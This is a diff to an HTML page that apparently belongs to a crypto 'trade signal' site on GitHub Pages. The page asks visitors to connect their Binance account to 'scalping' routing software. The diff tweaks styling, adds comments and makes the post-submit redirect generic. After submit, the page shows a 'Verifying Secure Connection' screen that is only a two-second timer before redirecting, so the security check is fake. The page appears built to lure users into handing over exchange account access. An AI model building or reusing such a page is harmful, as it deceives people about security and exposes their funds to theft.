@@ -31,7 +31,6 @@ body.dark{background:#0b0f14;color:white;}
 body.dark .app{background:#11161d;}
 .logo{display:block;margin:0 auto 28px;width:140px;}
 .page{padding:44px 32px;width:100%;position:absolute;top:0;left:0;background:inherit;transition:.55s cubic-bezier(.77,0,.18,1);}
-.slide{transform:translateX(-100%);}
 h1{text-align:center;margin-bottom:34px;color:#111;font-size:28px;}
 body.dark h1{color:white;}
 .field{position:relative;margin-bottom:24px;}
@@ -56,6 +55,7 @@ body.dark .theme{background:#222;color:white;}
 <div class="app">
 <div class="theme" onclick="toggleTheme()">☀︎ / 🌙</div>
 
+<!-- LOGIN PAGE -->
 <div class="page" id="login">
 <img src="logo.png" class="logo">
 <h1>Connect Trading Account Routing Software</h1>
@@ -73,7 +73,7 @@ body.dark .theme{background:#222;color:white;}
 </div>
 
 <button id="btn" type="submit">
-<span id="btnText">Connect</span>
+<span>Connect</span>
 </button>
 
 <p style="margin-top:14px;text-align:center;font-size:13px;line-height:1.45;opacity:.75;">
@@ -83,6 +83,7 @@ click on connect to automatically connect your binance account to the scalping r
 </form>
 </div>
 
+<!-- VERIFY PAGE -->
 <div class="page verify" id="verify" style="left:100%">
 <img src="logo.png" class="logo">
 <h1>Verifying Secure Connection</h1>
@@ -115,7 +116,7 @@ if(localStorage.getItem("theme")==="dark"){
   document.body.classList.add("dark");
 }
 
-form.addEventListener("submit",(e)=>{
+form.addEventListener("submit",function(e){
   e.preventDefault();
 
   btn.disabled=true;
@@ -123,8 +124,12 @@ form.addEventListener("submit",(e)=>{
   login.style.transform="translateX(-100%)";
   verify.style.transform="translateX(-100%)";
 
-  setTimeout(()=>{
-    window.location.replace("/Binstraccuratetradesignal/home.html");
+  setTimeout(function(){
+
+    // dynamic GitHub Pages safe redirect
+    const basePath = window.location.pathname.split('/')[1];
+    window.location.href = "/" + basePath + "/home.html";
+
   },2000);
 });
 </script>
